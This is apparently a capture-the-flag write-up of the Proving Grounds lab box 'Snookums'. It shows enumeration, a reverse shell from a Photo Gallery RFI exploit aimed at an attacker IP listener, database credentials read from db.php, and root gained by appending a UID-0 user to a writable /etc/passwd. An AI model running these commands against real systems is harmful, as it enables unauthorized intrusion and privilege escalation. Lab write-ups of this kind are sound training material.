Snookums is an intermediate Proving Grounds box, also rated as intermediate by the community. After gaining an initial foothold, we discover credentials within the target's database and laterally escalate. For privilege escalation, the `/etc/passwd` file is writable which allows for direct user creation, and in this case we initialize a new `root` user.

`nmap` scan:

```
nmap <target ip> -sS -sC -sV -Pn -p- -T4 --min-rate 10000
```

![Nmap 1](assets/snookums/nmap-1.png)

![Nmap 2](assets/snookums/nmap-2.png)

Check out port 80:

![Port80 1](assets/snookums/port_80-1.png)

We have a potential service name with `Simple PHP Photo Gallery`, could be important later. Let's `dirsearch` this `url`:

```
python3 dirsearch.py -u <target ip> -e html,txt,php -x 400,401,403,404
```

![Dirsearch 1](assets/snookums/dirsearch-1.png)

Nothing too interesting, and without credentials we cannot login. Enumerate `Simple PHP Photo Gallery v0.8`:

![Google 1](assets/snookums/google-1.png)

An interesting Github repo pops up with RFI that leads in RCE which is always great for hackers.

![Github 1](assets/snookums/github-1.png)

The version listed here is different from what's shown on port 80, but we'll try it anyway. Clone this repo and follow instructions.

Have a `nc` listener going, preferably on a port that's also open on the target so in this case we'll choose `33060`. Then, execute the exploit like this:

```
python3 exploit.py http://<target ip> <attacker ip> <attacker port>
```

![Exploit 1](assets/snookums/exploit-1.png)

![Exploit 2](assets/snookums/exploit-2.png)

We get a shell and can execute basic binaries which is great! Upgrade the initial shell with this:

```
python -c "import pty;pty.spawn('/bin/bash')"
```

![Shell 1](assets/snookums/shell-1.png)

A potential sensitive file is found under `/var/www/html`, `/db.php`:

![DB 1](assets/snookums/db-1.png)

```
root
MalapropDoffUtilize1337
```

From our `nmap` scan we also know that port `3306` is being used, which means that the target is running `mysql`. We can access `mysql` and try the credentials we just found:

```
mysql -u root -p
```

![MySQL 1](assets/snookums/mysql-1.png)

Enumerating the database leads us to user credentials:

![MySQL 2](assets/snookums/mysql-2.png)

The passwords all have `=` characters appended at the end which tells us that they are likely `base64` encoded. Let's start with `michael`:

```
echo 'U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==' | base64 -d
```

![Decode 1](assets/snookums/decode-1.png)

We decode the string until there aren't any `=` characters at the end, and now we're left with a human readable string:

```
HockSydneyCertify123
```

Can we login as `michael` with this password?

```
su michael
```

![Michael 1](assets/snookums/michael-1.png)

Nice, we can! Grab `local.txt` and let's move on to privilege escalation.

![Local txt 1](assets/snookums/local_txt-1.png)

Transfer `linpeas.sh` to the target machine inside of `/tmp`:

![Linpeas 1](assets/snookums/linpeas-1.png)

![Linpeas 2](assets/snookums/linpeas-2.png)

A writable `/etc/passwd` is huge. That file is incredibly sensitive, and having permissions as a normal user to edit it could directly lead to `root` access. Google `writable /etc/passwd`:

![Google 2](assets/snookums/google-2.png)

![Generating Hash 1](assets/snookums/generating_hash-1.png)

Create a password following these instructions:

```
openssl passwd -1 -salt password
```

![Password 1](assets/snookums/password-1.png)

Now we can construct a new user with this password. Also refer to the anatomy of a `/etc/passwd` entry:

![ETC Passwd ID 1](assets/snookums/etc_passwd_id-1.png)

An ID of `0` indicates the `root`, so if we combine our generated password with IDs of `0` we will have effectively created a `root` user.

```
newuser:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:/test:/root:/bin/bash
```

```
echo "newuser:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:/test:/root:/bin/bash" >> /etc/passwd
```

```
su newuser
```

![Root 1](assets/snookums/root-1.png)

Rooted! :partying_face:
